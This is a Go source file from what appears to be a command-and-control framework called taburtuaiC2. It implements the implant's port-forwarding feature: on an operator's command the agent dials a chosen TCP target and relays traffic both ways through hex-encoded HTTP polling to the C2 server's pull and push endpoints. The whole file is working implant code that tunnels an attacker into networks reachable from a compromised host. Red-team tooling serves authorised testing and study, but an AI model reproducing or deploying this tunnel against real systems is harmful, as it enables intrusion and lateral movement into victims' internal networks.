package main

import (
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handlePortFwdStart(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	if cmd.FwdSessID == "" || cmd.FwdTarget == "" {
		result.Error = "portfwd_start: missing sess_id or target"
		result.ExitCode = 1
		return
	}
	if err := StartPortFwd(agent, cmd.FwdSessID, cmd.FwdTarget); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("portfwd started: %s → %s", cmd.FwdSessID, cmd.FwdTarget)
}

func handlePortFwdStop(cmd *types.Command, result *types.CommandResult) {
	result.Output = StopPortFwd(cmd.FwdSessID)
}

// portFwdSession tracks one active tunnel on the agent.
type portFwdSession struct {
	sessID string
	conn   net.Conn
	done   chan struct{}
	once   sync.Once
}

var (
	portFwdMu       sync.Mutex
	activeFwdSess   = map[string]*portFwdSession{}
)

// StartPortFwd dials target and starts relay goroutines.
// Called by the portfwd_start command handler.
func StartPortFwd(agent *Agent, sessID, target string) error {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return fmt.Errorf("portfwd dial %s: %w", target, err)
	}

	sess := &portFwdSession{
		sessID: sessID,
		conn:   conn,
		done:   make(chan struct{}),
	}

	portFwdMu.Lock()
	activeFwdSess[sessID] = sess
	portFwdMu.Unlock()

	go sess.runPull(agent)
	go sess.runPush(agent)
	return nil
}

// StopPortFwd tears down the session identified by sessID.
func StopPortFwd(sessID string) string {
	portFwdMu.Lock()
	sess, ok := activeFwdSess[sessID]
	if ok {
		delete(activeFwdSess, sessID)
	}
	portFwdMu.Unlock()
	if ok {
		sess.close()
		return fmt.Sprintf("portfwd %s stopped", sessID)
	}
	return fmt.Sprintf("portfwd %s not found", sessID)
}

func (s *portFwdSession) close() {
	s.once.Do(func() {
		close(s.done)
		s.conn.Close()
	})
}

// runPull polls the C2 server for operator→target bytes and writes them to conn.
func (s *portFwdSession) runPull(agent *Agent) {
	defer s.close()
	url := strings.TrimRight(agent.cfg.ServerURL, "/") + "/api/v1/portfwd/" + s.sessID + "/pull"

	for {
		select {
		case <-s.done:
			return
		default:
		}

		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			return
		}
		agent.setHeaders(req)

		resp, err := agent.client.Do(req)
		if err != nil {
			select {
			case <-s.done:
				return
			case <-time.After(2 * time.Second):
				continue
			}
		}

		if resp.StatusCode == http.StatusGone {
			resp.Body.Close()
			return
		}
		if resp.StatusCode == http.StatusNoContent {
			resp.Body.Close()
			continue // no data, re-poll immediately
		}

		body, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		resp.Body.Close()
		if err != nil || len(body) == 0 {
			continue
		}

		data, err := hex.DecodeString(strings.TrimSpace(string(body)))
		if err != nil {
			continue
		}

		if _, err := s.conn.Write(data); err != nil {
			return
		}
	}
}

// runPush reads from the target TCP conn and POSTs bytes to the C2 server.
func (s *portFwdSession) runPush(agent *Agent) {
	defer s.close()
	url := strings.TrimRight(agent.cfg.ServerURL, "/") + "/api/v1/portfwd/" + s.sessID + "/push"
	buf := make([]byte, 32*1024)

	for {
		n, err := s.conn.Read(buf)
		if n > 0 {
			encoded := hex.EncodeToString(buf[:n])
			req, rerr := http.NewRequest("POST", url, strings.NewReader(encoded))
			if rerr != nil {
				return
			}
			agent.setHeaders(req)
			req.Header.Set("Content-Type", "text/plain")

			resp, rerr := agent.client.Do(req)
			if rerr == nil {
				resp.Body.Close()
				if resp.StatusCode == http.StatusGone {
					return
				}
			}
		}
		if err != nil {
			return
		}
	}
}
